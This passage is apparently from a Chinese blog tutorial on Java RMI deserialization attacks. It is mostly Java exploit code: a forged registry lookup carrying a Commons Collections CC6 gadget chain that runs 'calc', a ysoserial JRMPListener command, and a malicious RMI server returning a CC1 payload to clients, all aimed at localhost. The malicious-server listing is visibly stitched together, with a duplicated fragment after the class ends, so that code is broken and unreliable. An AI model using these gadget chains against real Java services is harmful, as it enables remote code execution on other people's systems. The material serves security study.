<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClientdemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">(Registry registry, Object o)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取ref</span></span><br><span class="line">        Field[] fields_0=registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        UnicastRef ref=(UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line">        Field[] fields_1=registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations=(Operation[])fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line">        <span class="comment">//伪造lookup代码</span></span><br><span class="line">        RemoteCall var2=ref.newCall((RemoteObject)registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        ObjectOutput var3=var2.getOutputStream();</span><br><span class="line">        var3.writeObject(o);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC6</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass=LazyMap.class;</span><br><span class="line">        Field factoryField=lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WrapperClass</span>(expMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Registry registry=LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        lookup(registry,CC6());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">WrapperClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Remote&#123;</span><br><span class="line">        <span class="keyword">private</span> Object obj;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">WrapperClass</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.obj=o;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端和注册中心代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;<span class="comment">//注册中心&amp;服务端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        RemoteInterfaceImpl remoteInterface=<span class="keyword">new</span> <span class="title class_">RemoteInterfaceImpl</span>();</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://localhost:1099/RemoteInterfaceImpl&quot;</span>,remoteInterface);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241113163336313.png" class="" title="image-20241113163336313">

<h2 id="攻击client"><a href="#攻击client" class="headerlink" title="攻击client"></a>攻击client</h2><p>如果攻击的目标作为 Client 端，也就是在 Registry 地址可控，或 Registry&#x2F;Server 端可控，也是可以导致攻击的。客户端主要有两个交互行为，第一是从 Registry 端获取调用服务的 stub（RegistryImpl_Stub实例）序列化后再反序列化，第二是调用服务后获取执行结果并反序列化。</p>
<h3 id="01registry端攻击client端"><a href="#01registry端攻击client端" class="headerlink" title="01registry端攻击client端"></a>01registry端攻击client端</h3><p>对于注册中心来说，我们还是从下面几个方法触发：</p>
<ul>
<li>bind</li>
<li>unbind</li>
<li>rebind</li>
<li>list</li>
<li>lookup</li>
</ul>
<p>当执行上面的操作的时候，registry端发送序列化的数据给client端，client端进行反序列化的时候就会触发反序列化漏洞，</p>
<p>调用栈为：<code>RegistryImpl_Stub#lookup(或者是其他方法)-&gt;UnicastRef#invoke()-&gt;StreamRemoteCall#executeCall()-&gt;ObjectInputStream#readObject()</code></p>
<h4 id="攻击JRMP客户端"><a href="#攻击JRMP客户端" class="headerlink" title="攻击JRMP客户端"></a>攻击JRMP客户端</h4><p>首先启动ysoserial的<code>JRMPListener</code>，开启一个恶意的注册中心，有关<code>JRMPListener</code>，halfblue的解释如下：</p>
<blockquote>
<p>只要客户端的stub发起JRMP请求，就会调用UnicastRef#invoke，也就会调用StreamRemoteCall#executeCall，导致被反序列化攻击。这里想实现攻击需要自己实现一个恶意服务端，把返回的异常信息改成payload，其实这就是ysoserial里面的exploit&#x2F;JRMPListener实现的功能。具体实现大概就是从TCPTransport#run0拷过来，没用的删删，改改最后处理的地方。<br>具体使用是先启动监听</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span> .\ysoserial<span class="literal">-all</span>.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections1 <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后开始写客户端</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Clientdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        Naming.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="comment">//        Naming.list(&quot;hello&quot;);</span></span><br><span class="line"><span class="comment">//        Naming.unbind(&quot;hello&quot;);</span></span><br><span class="line"><span class="comment">//        Naming.rebind(&quot;hello&quot;, new RemoteClass());</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RemoteClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Remote &#123;</span><br><span class="line">        <span class="keyword">private</span> Object object;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">RemoteClass</span><span class="params">(Object object)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">this</span>.object=object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">RemoteClass</span><span class="params">()</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实五个方法都可以进行反序列化攻击，不过传入<code>bind/rebind</code>的对象除了要继承<code>Remote</code>接口之外还需要继承<code>Serializable</code>接口</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241115184108606.png" class="" title="image-20241115184108606">

<h3 id="02server端攻击client端"><a href="#02server端攻击client端" class="headerlink" title="02server端攻击client端"></a>02server端攻击client端</h3><p>server端攻击client端有两种情况：一种是利用codebase远程加载对象，另一种就是像client端攻击server端一样，传入恶意Object。</p>
<h4 id="client端调用server端的恶意方法，server端传入恶意对象"><a href="#client端调用server端的恶意方法，server端传入恶意对象" class="headerlink" title="client端调用server端的恶意方法，server端传入恶意对象"></a>client端调用server端的恶意方法，server端传入恶意对象</h4><p>我们以传入恶意Object为例，client调用server的方法，server将调用结果序列化后返回给client，client再调用<code>Unicast#invoke</code>，然后里面调用到<code>unmarshalValue</code>方法对结果进行反序列化，这一点和client攻击servere端是一样的。如果server端返回值类型为Object的恶意方法，然后在client端调用这个恶意方法并且反序列化，就可以进行攻击，下面是恶意server端：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;<span class="comment">//服务端攻击客户端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        EvilInterface evilInterfaceImpl=<span class="keyword">new</span> <span class="title class_">EvilInterfaceImpl</span>();</span><br><span class="line">        Registry registry=LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://localhost:1099/evilInterfaceImpl&quot;</span>,evilInterfaceImpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">EvilInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvilInterfaceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">EvilInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilInterfaceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor ctor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler o=(InvocationHandler) ctor.newInstance(Target.class,transformedMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   Naming.bind(<span class="string">&quot;rmi://localhost:1099/evilserver&quot;</span>,evilInterfaceImpl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">interface</span> <span class="title class_">EvilInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EvilInterfaceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">EvilInterface</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilInterfaceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">            Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">            Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">            Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            InvocationHandler o=(InvocationHandler) constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">            <span class="keyword">return</span> o;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>client端调用恶意方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(<span class="string">&quot;localshot&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        EvilInterface evilInterface=(EvilInterface) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/evilInterfaceImpl&quot;</span>);</span><br><span class="line">        evilInterface.CC1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">EvilInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用codebase进行攻击（待填坑）"><a href="#利用codebase进行攻击（待填坑）" class="headerlink" title="利用codebase进行攻击（待填坑）"></a>利用codebase进行攻击（待填坑）</h4><p>利用codebase进行攻击的条件较为苛刻，这里先不介绍</p>
<h2 id="攻击DGC"><a href="#攻击DGC" class="headerlink" title="攻击DGC"></a>攻击DGC</h2><p>我们分析RMI整个通信过程的时候，在最后一步：server端响应client端的方法调用的时候，就会接收到<code>DGCImpl_Stub</code>对象</p>
<p>什么是DGC呢，这里也引用一下su18师傅的文章：</p>
<blockquote>
<p>DGC（Distributed Garbage Collection）—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。</p>
</blockquote>
<p>RMI定义了一个接口<code>java.rmi.dgc.DGC</code></p>
